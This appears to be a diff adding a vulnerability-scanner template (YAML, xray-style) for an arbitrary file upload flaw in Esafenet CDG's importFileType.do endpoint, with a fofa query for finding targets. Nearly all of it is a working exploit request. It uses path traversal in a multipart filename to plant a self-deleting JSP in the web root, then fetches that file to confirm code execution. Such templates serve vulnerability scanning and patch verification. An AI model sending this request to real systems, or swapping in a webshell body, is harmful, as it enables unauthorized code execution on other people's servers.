@@ -1,0 +1,41 @@
+name: esafenet-cdg-importfiletype-upload
+
+info:
+  name: 亿赛通 电子文档安全管理系统 importFileType.do 任意文件上传漏洞
+  author: IMF5er
+  severity: high
+  reference:
+    - https://www.fiversec.com/
+  description: |
+  亿赛通 电子文档安全管理系统 importFileType.do 任意文件上传漏洞
+  fofa: app="亿赛通-电子文档安全管理系统"
+
+set:
+    r1: randomLowercase(6)
+    r2: randomInt(200, 500)
+    r3: randomInt(600, 900)
+    rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /CDGServer3/fileType/importFileType.do?flag=syn_user_policy
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+          ------WebKitFormBoundary{{rboundary}}\r\n\
+          Content-Disposition: form-data; name=\"fileshare\"; filename=\"/..\\\\..\\\\..\\\\..\\\\webapps\\\\ROOT\\\\{{r1}}.jsp\"\r\n\
+          \r\n\
+          <% out.println({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n\
+          \r\n\
+          ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+      follow_redirects: false
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /{{r1}}.jsp
+      follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r2 * r3)))
+expression: r0() && r1()
